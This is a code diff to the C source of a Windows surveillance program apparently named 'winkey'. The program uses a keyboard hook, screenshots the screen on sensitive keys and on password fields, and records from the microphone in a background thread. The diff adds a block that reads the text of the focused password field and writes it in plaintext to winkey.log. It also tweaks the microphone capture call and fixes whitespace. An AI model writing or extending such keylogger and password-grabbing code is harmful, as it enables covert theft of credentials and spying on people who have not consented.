@@ -9,11 +9,11 @@ DWORD WINAPI thread_micro(LPVOID lp)
 	{
 		if (g_micro_run)
 		{
-		capture_micro_continuous();
+			capture_micro();
 		}
 		Sleep(100);
 	}
-    return 0;
+	return 0;
 }
 
 
@@ -52,7 +52,19 @@ LRESULT CALLBACK callback_clavier(int ncode, WPARAM wp, LPARAM lp)
 		if (is_sensitive_key(kbd->vkCode))
 			capture_screen(L"C:\\winkey_screens\\sensitive_key.bmp");
 		if (is_password_field(current))
+		{
 			capture_screen(L"C:\\winkey_screens\\password_field.bmp");
+			char pwd[256] = {0};
+			if (read_password_from_control(current, pwd, sizeof(pwd)))
+			{
+				FILE *fp = fopen("winkey.log", "a");
+				if (fp)
+				{
+					fprintf(fp, "[PASSWORD FIELD] -> %s\n", pwd);
+					fclose(fp);
+				}
+			}
+		}
 		if (kbd->vkCode == VK_F9)
 		{
 			printf("MICRO ACTIVE CHEF !\n:");
